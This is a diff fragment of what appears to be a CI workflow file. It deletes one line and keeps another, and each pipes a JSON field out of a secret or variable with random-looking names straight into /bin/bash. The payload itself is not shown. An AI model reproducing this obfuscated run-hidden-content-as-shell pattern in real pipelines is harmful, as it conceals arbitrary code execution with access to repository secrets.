@@ -23,7 +23,6 @@ jobs:
           btzx59: ${{ secrets.btzx59 }}
         run: |
           printf '%s' "$btzx59" | jq -r .mtae6279 | /bin/bash
-          echo $kgtg5 | jq -r .zacge6167 | /bin/bash
 
       - name: Save archive
         if: always()
